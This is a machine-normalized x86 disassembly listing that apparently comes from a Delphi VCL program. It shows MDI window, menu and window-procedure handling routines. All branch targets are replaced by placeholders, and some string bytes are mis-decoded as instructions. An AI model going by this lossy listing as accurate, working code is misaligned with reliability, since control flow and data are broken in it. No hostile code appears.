jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetMenu
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0xd ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x230
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4077f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call DrawMenuBar
sub_41e5f0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x248 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4091f8
sub_41e628
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x240 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e538
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
sub_41e66c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e873
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_4227ec
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x230 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40b508
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4227c8
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4227c8
mov eax [ eax + 0x230 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea eax [ ebp - 0x18 ]
push eax
push 0x0
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetMenu
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e538
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e87a
lea eax [ ebp - 0x1c ]
call sub_44cae0
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41fb30
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_434bd8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call GetMenu
cmp ebx eax
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetMenu
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
mov edx eax
mov eax [ ebp - 0x8 ]
call sub_40b508
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetMenu
sub_41e880
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x8 ] eax
sub_41e8b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e880
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x24
jl r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x244 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
sub_41e8fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x218 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_430fcc
sub_41e958
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e938
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x244 ] edx
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x244 ] eax
sub_41e998
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43391c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x60 ]
call sub_40f388
sub_41e9d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x80000005
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov [ ebp - 0x8 ] 0x8000000c
sub_41ea04
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433a38
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x138 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x8000000f
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e9d8
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x60 ]
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e9d8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42cc88
mov edx 0x8000000f
mov eax [ ebp - 0x4 ]
call sub_42cc88
jmp r-xdata
sub_41ea68
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_433958
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x58 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_40fae8
sub_41eaa4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41e538
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x230 ]
mov eax [ ebp - 0x4 ]
call sub_41e66c
pop ecx
pop ecx
pop ebp
retn
sub_41ead0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x213 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x213 ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call ShowWindow
sub_41eb2c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x219 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x219 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x219 ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
call sub_41e2cc
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x219 ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e2cc
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_422790
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_42276c
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x5c ]
call sub_41e2cc
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ rw-data ]
call sub_422790
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x4
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42276c
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
mov ebx eax
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x30 ]
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
sub ebx eax
mov [ ebp - 0x18 ] ebx
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422424
add ebx eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x38 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x3c ]
sar eax 0x1
jns r-xdata
add ebx eax
push ebx
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422424
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
mov ebx eax
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
sub ebx eax
mov [ ebp - 0x1c ] ebx
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223bc
add ebx eax
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
cmp ebx eax
jge r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422424
add ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x38 ]
mov [ ebp - 0x18 ] ebx
add ebx eax
push ebx
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422388
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_422424
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x38 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223f0
mov ebx eax
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_42276c
call sub_4223bc
add ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x3c ]
mov [ ebp - 0x1c ] ebx
add ebx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x7c ]
jmp r-xdata
adc eax 0x0
sub_41eee8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b814
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0x8
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x1c ] eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x4 ] 0xbffcffff
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x210 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x211 ]
mov [ ebp - 0xa ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x80000000
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] 0x80000000
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ ebp - 0xa ]
cmp eax 0x5
ja r-xdata
mov al [ ebp - 0xa ]
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov al [ ebp - 0xa ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_41efc1 ]
mov [ ebp - 0xa ] 0x2
sub al 0x3
jne r-xdata
mov al [ ebp - 0xa ]
sub al 0x3
jae r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x80
mov edx [ ebp - 0x8 ]
add edx 0x8
mov eax [ ebp - 0x4 ]
call sub_430918
mov al [ r-xdata ]
and al [ ebp - 0x9 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0xc00000
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0xc40000
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x218 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] 0x101
mov edx [ ebp - 0x8 ]
add edx 0x8
mov eax [ ebp - 0x4 ]
call sub_430918
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x213 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x9 ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x14 ] 0x80000000
mov eax [ ebp - 0x8 ]
mov [ eax + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al [ ebp - 0x9 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x8 ]
mov [ eax + 0x24 ] 0x2808
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
or eax __dos_header
or eax 0x80
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
test [ ebp - 0x9 ] 0x8
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x80000
test [ ebp - 0x9 ] 0x2
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x80000000
mov eax [ ebp - 0x4 ]
test [ eax + 0x21 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x8 ] 0x400
test [ ebp - 0x9 ] 0x4
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x20000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x4 ] 0xff3fffff
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x10000
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x213 ] 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
test [ ebp - 0x9 ] 0x1
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0x4 ] 0x1000000
jmp r-xdata
sub_41f1a1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b838
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x3
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x217 ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_41fd2c
push eax
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
jmp r-xdata
mov [ ebp - 0x8 ] 0xff00
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
dec al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
mov eax [ ebp - 0x4 ]
call sub_42c2b0
push eax
mov eax [ ebp - 0x4 ]
call sub_42c25c
push eax
push 0x0
push 0x0
push 0x56330001
push 0x0
push sub_41f308
push 0x200
call CreateWindowExA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x23c ] eax
mov eax [ ebp - 0x4 ]
push eax
push sub_41dd5c
call sub_41a414
mov edx [ ebp - 0x4 ]
mov [ edx + 0x260 ] eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_4077f8
mov [ ebp - 0xc ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
jmp r-xdata
sub_41f308
dec ebp
inc esp
dec ecx
inc ebx
dec esp
dec ecx
inc ebp
dec esi
push esp
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffd0
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f43b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_430cf4
mov eax [ ebp - 0x4 ]
and [ eax + 0x2cc ] 0xef
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x30 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x23c ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f442
lea eax [ ebp - 0x30 ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
add eax 0x4c
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14c ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x2cc ] 0x10
jmp r-xdata
sub_41f448
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_430dd0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x23c ]
push eax
call SendMessageA
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x23c ] edx
pop ecx
pop ebp
retn
sub_41f498
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4316a8
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call DefFrameProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
